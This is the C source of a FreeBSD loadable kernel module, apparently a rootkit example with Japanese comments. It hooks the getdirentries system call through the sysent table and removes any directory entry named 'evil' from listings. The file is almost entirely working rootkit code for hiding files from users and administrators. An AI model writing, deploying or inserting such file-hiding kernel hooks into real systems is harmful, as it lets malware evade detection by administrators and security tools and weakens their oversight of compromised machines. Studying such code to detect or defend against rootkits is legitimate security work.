#include <sys/types.h>
#include <sys/param.h>
#include <sys/kernel.h>
#include <sys/malloc.h>
#include <sys/module.h>
#include <sys/proc.h>
#include <sys/syscall.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/systm.h>
#include <sys/dirent.h>

#define TARGET "evil"

static int hook_getdirentries(struct thread *td, void *args)
{
	struct getdirentries_args *uap;
	unsigned int size, count;
	int error;
	struct dirent *dp, *current;

	uap = (struct getdirentries_args *)args;
	error = sys_getdirentries(td, args);
	size = td->td_retval[0];

	/* エントリがあるかどうか確認する（なかった場合はsizeが0となる） */
	if (size > 0) {
		dp = malloc(size, M_TEMP, M_WAITOK);
		copyin(uap->buf, dp, size);

		count = size;
		current = dp;

		/* エントリのリストを走査する */
		while ((current->d_reclen != 0) && (count > 0)) {
			count -= current->d_reclen;

			/* エントリ名を目的ファイル名と比較する */
			if (strcmp(current->d_name, TARGET) == 0) {
				if (count != 0) {
					/* このエントリをリストから省略する */
					bcopy(
					(char *)current + current->d_reclen, 
					current, count);
				}

				size -= current->d_reclen;
				break;
			}

			if (count > 0) {
				/* currentポインタを更新する */
				current = (struct dirent *)
					((char *)current + current->d_reclen);
			}
		}

		/* 変更を適用する */
		td->td_retval[0] = size;
		copyout(dp, uap->buf, size);
		free(dp, M_TEMP);
	}

	return error;
}

static int load(struct module *module, int cmd, void *args)
{
	int error = 0;

	switch(cmd) {
	case MOD_LOAD:
		sysent[SYS_getdirentries].sy_call = 
			(sy_call_t *)hook_getdirentries;
		uprintf("getdirentries is at %p\n",
			(void *)sysent[SYS_getdirentries].sy_call);
		break;
	case MOD_UNLOAD:
		sysent[SYS_getdirentries].sy_call = 
			(sy_call_t *)sys_getdirentries;
		uprintf("getdirentries is at %p\n",
			(void *)sysent[SYS_getdirentries].sy_call);
		break;
	default:
		error = EOPNOTSUPP;
		break;
	}

	return error;
}

static moduledata_t hiding_files_mod = {
	"hiding_files",
	load,
	NULL
};

DECLARE_MODULE(hiding_files, hiding_files_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);